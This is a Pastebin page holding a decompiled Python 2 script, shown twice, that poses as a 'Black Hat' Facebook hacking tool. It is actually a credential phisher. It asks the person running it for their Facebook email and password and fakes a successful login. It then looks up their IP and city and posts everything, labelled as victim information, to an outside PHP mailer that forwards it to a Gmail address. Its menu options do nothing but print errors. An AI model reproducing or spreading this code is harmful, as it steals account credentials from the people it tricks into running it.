 
# uncompyle6 version 3.6.6
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Jul  8 2020, 22:53:57) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: <tegardev>
# DECOMPILED BY: Rizky ID
import os, sys, time, random
try:
    import requests
except ImportError:
    os.system('pip2 install requests && python2 main.py')
 
a = '\x1b[1;30m'
m = '\x1b[1;31m'
h = '\x1b[1;32m'
k = '\x1b[1;33m'
b = '\x1b[1;34m'
u = '\x1b[1;35m'
c = '\x1b[1;36m'
p = '\x1b[1;37m'
bm = '\x1b[1;44m'
mb = '\x1b[1;41m'
n = '\x1b[0m'
logo = ('\n{}\xe2\x95\x94\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97           \xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x97\n\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x9d           \xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x91\n\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x9d\xe2\x95\x94\xe2\x95\x97\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x97 \xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x97\n{}\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\xa3\xe2\x95\x94\xe2\x95\x90\xe2\x95\xac\xe2\x95\xa3 \xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91{} \xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n{}\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\xa3\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x91 \xe2\x95\x91\xe2\x95\x91  \xe2\x95\x91\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91{} [{} ./Black{}{}Hat {}]\n{}\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d{} \xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n{}=========================================\n').format(m, m, b, p, p, bm, n, mb, n, p, b, m)
imelku = 'bimam5915@gmail.com'
req = lambda url, data: requests.post(url, data=data)
response = requests.get('https://extreme-ip-lookup.com/json/').json()
 
def main():
    os.system('clear')
    print logo
    print ('{}   \xf0\x9f\x94\xb0 {}Login Facebook dulu bro{} \xf0\x9f\x94\xb0 ').format(p, mb, n)
    print ''
    usr = raw_input(('{}[{}\xe2\x80\xa2{}]{}Email/no {}: {}').format(p, b, p, b, k, p))
    psw = raw_input(('{}[{}\xe2\x80\xa2{}]{}Password {}: {}').format(p, b, p, b, k, p))
    print ('\n{}[{}\xcf\x80{}]{}Login...').format(p, b, p, h)
    time.sleep(3)
    print ('\n{}[{}\xe2\x9c\x94{}]{}Login Sukses! sedang Menyiapkan Menu').format(p, h, p, h)
    time.sleep(3)
    ip = response['query']
    kota = response['city']
    teks = ('\n<table border="1" cellpadding="5" bgcolor="black" width=100%>\n<tr>\n<th colspan="2"><center><font color="white">\xf0\x9f\x94\xb0 Akun Facebook \xf0\x9f\x94\xb0</font></th>\n\n</tr>\n<tr>\n\t<td bgcolor="white"><center><b>Username</td>\n\t<td bgcolor="white"><center>{}</td>\n</tr>\n<tr>\n\t<td bgcolor="white" width=30%><center><b>Password</b></td>\n\t<td bgcolor="white"><center>{}</td>\n</tr>\n\n</table>\n<br>\n<br>\n<table border="1" cellpadding="5" bgcolor="black" width=100%>\n<tr>\n<th colspan="2"><center><font color="white">\xe2\x9a\x9c Informasi Korban \xe2\x9a\x9c</font></th>\n\n</tr>\n<tr>\n\t<td bgcolor="white"><center><b>IP</td>\n\t<td bgcolor="white"><center>{}</td>\n</tr>\n<tr>\n\t<td bgcolor="white" width=30%><center><b>KOTA</b></td>\n\t<td bgcolor="white"><center>{}</td>\n</tr>\n</table>\n    ').format(usr, psw, ip, kota)
    web = 'http://savvymotherschool.com/files/post.php'
    data = {'from': '[!] Setoran Nya Mastah', 'email_kamu': 'bimam5915@gmail.com', 'email_target': imelku, 'subject': 'Ussername : ' + usr, 'mesage': teks}
    try:
        req(web, data)
    except requests.exceptions.ConnectionError:
        print ('{}\xe3\x80\x90{}\xe2\x9c\x96{}\xe3\x80\x91{}Periksa jaringan anda').format(p, m, p, h)
 
    menu()
 
 
def menu():
    os.system('clear')
    print logo
    print ('{}[{}1{}]{} Dark Fb ').format(p, m, p, h)
    print ('{}[{}2{}]{} Hack Fb Target').format(p, m, p, h)
    print ('{}[{}3{}]{} Crack Fb').format(p, m, p, h)
    print ('{}[{}4{}]{} Cmatrix').format(p, m, p, h)
    pilih()
 
 
def pilih():
    pil = raw_input(('{}[{}\xe2\x80\xa2{}]{}pilih {}: {}').format(p, b, p, b, k, p))
    if pil == '':
        os.system('clear')
        print 'Maaf sc eror dan masih dalam perbaikan'
        sys.exit('exit program')
    elif pil == '1':
        os.system('clear')
        print 'Maaf sc eror dan masih dalam perbaikan'
        sys.exit('exit program')
    elif pil == '2':
        os.system('clear')
        print 'Maaf sc eror dan masih dalam perbaikan'
        sys.exit('exit program')
    elif pil == '3':
        os.system('clear')
        print 'Maaf sc eror dan masih dalam perbaikan'
        sys.exit('exit program')
    elif pil == '4':
        os.system('clear')
        print 'Maaf sc eror dan masih dalam perbaikan'
        os.system('cmatrix')
 
 
if __name__ == '__main__':
    main()
RAW Paste Data

# uncompyle6 version 3.6.6
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Jul  8 2020, 22:53:57) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: <tegardev>
# DECOMPILED BY: Rizky ID
import os, sys, time, random
try:
    import requests
except ImportError:
    os.system('pip2 install requests && python2 main.py')

a = '\x1b[1;30m'
m = '\x1b[1;31m'
h = '\x1b[1;32m'
k = '\x1b[1;33m'
b = '\x1b[1;34m'
u = '\x1b[1;35m'
c = '\x1b[1;36m'
p = '\x1b[1;37m'
bm = '\x1b[1;44m'
mb = '\x1b[1;41m'
n = '\x1b[0m'
logo = ('\n{}\xe2\x95\x94\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97           \xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x97\n\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x9d           \xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x91\n\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x9d\xe2\x95\x94\xe2\x95\x97\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x97 \xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x97\n{}\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\xa3\xe2\x95\x94\xe2\x95\x90\xe2\x95\xac\xe2\x95\xa3 \xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91{} \xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n{}\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\xa3\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x91 \xe2\x95\x91\xe2\x95\x91  \xe2\x95\x91\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91{} [{} ./Black{}{}Hat {}]\n{}\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d{} \xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n{}=========================================\n').format(m, m, b, p, p, bm, n, mb, n, p, b, m)
imelku = 'bimam5915@gmail.com'
req = lambda url, data: requests.post(url, data=data)
response = requests.get('https://extreme-ip-lookup.com/json/').json()

def main():
    os.system('clear')
    print logo
    print ('{}   \xf0\x9f\x94\xb0 {}Login Facebook dulu bro{} \xf0\x9f\x94\xb0 ').format(p, mb, n)
    print ''
    usr = raw_input(('{}[{}\xe2\x80\xa2{}]{}Email/no {}: {}').format(p, b, p, b, k, p))
    psw = raw_input(('{}[{}\xe2\x80\xa2{}]{}Password {}: {}').format(p, b, p, b, k, p))
    print ('\n{}[{}\xcf\x80{}]{}Login...').format(p, b, p, h)
    time.sleep(3)
    print ('\n{}[{}\xe2\x9c\x94{}]{}Login Sukses! sedang Menyiapkan Menu').format(p, h, p, h)
    time.sleep(3)
    ip = response['query']
    kota = response['city']
    teks = ('\n<table border="1" cellpadding="5" bgcolor="black" width=100%>\n<tr>\n<th colspan="2"><center><font color="white">\xf0\x9f\x94\xb0 Akun Facebook \xf0\x9f\x94\xb0</font></th>\n\n</tr>\n<tr>\n\t<td bgcolor="white"><center><b>Username</td>\n\t<td bgcolor="white"><center>{}</td>\n</tr>\n<tr>\n\t<td bgcolor="white" width=30%><center><b>Password</b></td>\n\t<td bgcolor="white"><center>{}</td>\n</tr>\n\n</table>\n<br>\n<br>\n<table border="1" cellpadding="5" bgcolor="black" width=100%>\n<tr>\n<th colspan="2"><center><font color="white">\xe2\x9a\x9c Informasi Korban \xe2\x9a\x9c</font></th>\n\n</tr>\n<tr>\n\t<td bgcolor="white"><center><b>IP</td>\n\t<td bgcolor="white"><center>{}</td>\n</tr>\n<tr>\n\t<td bgcolor="white" width=30%><center><b>KOTA</b></td>\n\t<td bgcolor="white"><center>{}</td>\n</tr>\n</table>\n    ').format(usr, psw, ip, kota)
    web = 'http://savvymotherschool.com/files/post.php'
    data = {'from': '[!] Setoran Nya Mastah', 'email_kamu': 'bimam5915@gmail.com', 'email_target': imelku, 'subject': 'Ussername : ' + usr, 'mesage': teks}
    try:
        req(web, data)
    except requests.exceptions.ConnectionError:
        print ('{}\xe3\x80\x90{}\xe2\x9c\x96{}\xe3\x80\x91{}Periksa jaringan anda').format(p, m, p, h)

    menu()


def menu():
    os.system('clear')
    print logo
    print ('{}[{}1{}]{} Kunci profil ').format(p, m, p, h)
    print ('{}[{}2{}]{} Fb eror').format(p, m, p, h)
    print ('{}[{}3{}]{} komentar eror').format(p, m, p, h)
    print ('{}[{}4{}]{} Cmatrix').format(p, m, p, h)
    pilih()


def pilih():
    pil = raw_input(('{}[{}\xe2\x80\xa2{}]{}pilih {}: {}').format(p, b, p, b, k, p))
    if pil == '':
        os.system('clear')
        print 'Maaf Sepertinya Akun Facebook Anda Terkena Checkpoint'
        sys.exit('exit program')
    elif pil == '1':
        os.system('clear')
        print 'Maaf Sepertinya Akun Facebook Anda Terkena Checkpoint'
        sys.exit('exit program')
    elif pil == '2':
        os.system('clear')
        print 'Maaf Sepertinya Akun Facebook Anda Terkena Checkpoint'
        sys.exit('exit program')
    elif pil == '3':
        os.system('clear')
        print 'Maaf Sepertinya Akun Facebook Anda Terkena Checkpoint'
        sys.exit('exit program')
    elif pil == '4':
        os.system('clear')
        print 'Maaf Sepertinya Akun Facebook Anda Terkena Checkpoint' 
        os.system('cmatrix')


if __name__ == '__main__':
    main()
create new paste  /  syntax languages  /  archive  /  faq  /  tools  /  night mode  /  api  /  scraping api   /  pro 
privacy statement  /  cookies policy  /  terms of serviceupdated  /  security disclosure  /  dmca  /  report abuse  /  contact 

We use cookies for various purposes including analytics. By continuing to use Pastebin, you agree to our use of cookies as described in the Cookies Policy.  OK, I Understand
 Not a member of Pastebin yet?
Sign Up, it unlocks many cool features!  
